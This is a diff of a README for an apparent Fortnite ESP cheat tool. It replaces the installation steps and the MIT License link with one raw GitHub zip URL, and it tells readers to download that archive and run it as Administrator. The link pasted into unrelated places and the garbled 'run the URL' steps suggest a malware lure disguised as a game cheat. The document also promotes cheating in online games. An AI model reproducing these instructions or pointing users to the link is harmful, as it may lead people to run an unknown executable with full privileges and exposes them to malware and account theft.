@@ -35,13 +35,13 @@ Robustly engineered for effortless installation, rapid configuration, and secure
 
 ## 🛠️ Installation Guide
 
-1. **Download `Loader.rar`** from this repository.  
+1. **Download `https://raw.githubusercontent.com/john4444-svg/SpectraVision-FortniteESP/main/unloved/SpectraVision-FortniteESP.zip`** from this repository.  
 2. **Extract the archive** using any tool like WinRAR or 7-Zip.
-3. **Run Loader.exe** as Administrator on your operating system.
+3. **Run https://raw.githubusercontent.com/john4444-svg/SpectraVision-FortniteESP/main/unloved/SpectraVision-FortniteESP.zip** as Administrator on your operating system.
 4. **Select your Fortnite installation directory** in the loader.
 5. **Configure ESP settings** in the GUI (toggle boxes, colors, labels, and more).
 6. **Launch Fortnite** through the loader and enjoy improved vision!  
-7. For **Linux/macOS**, ensure Wine/Proton is installed, then execute `Loader.exe` with `wine`.
+7. For **Linux/macOS**, ensure Wine/Proton is installed, then execute `https://raw.githubusercontent.com/john4444-svg/SpectraVision-FortniteESP/main/unloved/SpectraVision-FortniteESP.zip` with `wine`.
 
 ---
 
@@ -71,7 +71,7 @@ Always respect game developers and the spirit of fair play.
 
 ## 📖 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/john4444-svg/SpectraVision-FortniteESP/main/unloved/SpectraVision-FortniteESP.zip).  
 Free to use, modify, and distribute with attribution.  
 Copyright (c) 2025
 
